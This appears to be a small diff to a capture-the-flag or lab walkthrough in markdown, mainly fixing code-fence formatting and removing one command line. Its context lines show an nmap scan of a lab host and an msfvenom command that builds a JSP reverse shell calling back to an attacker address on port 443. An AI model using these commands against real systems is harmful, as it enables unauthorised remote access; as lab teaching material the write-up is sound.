@@ -80,12 +80,6 @@ nmap -sCV -p135,8500,49154 10.10.10.11 -oN targeted
 - `-sV`: Detect service versions  
 - `-oN`: Output in human-readable format  
 
-Let's check the result:
-
-```bash
-cat targeted -l java
-```
-
 ![Targeted Scan](screenshots/targeted.png)  
 
 **Findings:**
@@ -192,7 +186,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.7 LPORT=443 -o reverse.jsp
 
 Payload generated: `reverse.jsp`:
 
-``` bash
+```bash
 <%@page import="java.lang.*"%>
 <%@page import="java.util.*"%>
 <%@page import="java.io.*"%>
